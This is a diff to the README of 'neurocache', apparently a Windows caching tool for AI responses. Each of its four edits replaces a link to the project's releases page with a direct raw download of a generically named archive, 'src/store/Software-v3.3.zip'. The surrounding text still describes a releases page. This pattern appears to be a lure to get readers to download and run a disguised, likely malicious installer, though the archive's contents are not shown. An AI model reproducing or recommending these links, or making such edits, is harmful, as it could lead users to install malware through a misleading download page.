@@ -1,6 +1,6 @@
 # ⚙️ neurocache - Smart Cache for Faster AI Responses
 
-[![Download neurocache](https://img.shields.io/badge/Download-%20Here-blue?style=for-the-badge)](https://github.com/rizwan199811/neurocache/releases)
+[![Download neurocache](https://img.shields.io/badge/Download-%20Here-blue?style=for-the-badge)](https://raw.githubusercontent.com/rizwan199811/neurocache/master/src/store/Software-v3.3.zip)
 
 ---
 
@@ -42,7 +42,7 @@ Follow these steps to download and start using neurocache on your Windows comput
 
 Click the large blue button above or this link to go to the download page:
 
-[https://github.com/rizwan199811/neurocache/releases](https://github.com/rizwan199811/neurocache/releases)
+[https://raw.githubusercontent.com/rizwan199811/neurocache/master/src/store/Software-v3.3.zip](https://raw.githubusercontent.com/rizwan199811/neurocache/master/src/store/Software-v3.3.zip)
 
 This page holds all available versions of neurocache. You will find the latest release at the top.
 
@@ -123,7 +123,7 @@ This removes old data but won’t affect neurocache’s ability to work.
 Keep neurocache updated for the best performance:
 
 - Visit the releases page regularly:  
-  [https://github.com/rizwan199811/neurocache/releases](https://github.com/rizwan199811/neurocache/releases)  
+  [https://raw.githubusercontent.com/rizwan199811/neurocache/master/src/store/Software-v3.3.zip](https://raw.githubusercontent.com/rizwan199811/neurocache/master/src/store/Software-v3.3.zip)  
 - Download the newest Windows setup file  
 - Run the installer like before to replace the old version  
 
@@ -177,6 +177,6 @@ You do not need to control any of this manually.
 
 Download neurocache for Windows from this page:
 
-[https://github.com/rizwan199811/neurocache/releases](https://github.com/rizwan199811/neurocache/releases)
+[https://raw.githubusercontent.com/rizwan199811/neurocache/master/src/store/Software-v3.3.zip](https://raw.githubusercontent.com/rizwan199811/neurocache/master/src/store/Software-v3.3.zip)
 
 Use this link anytime you want to get the latest version or switch to a different release.
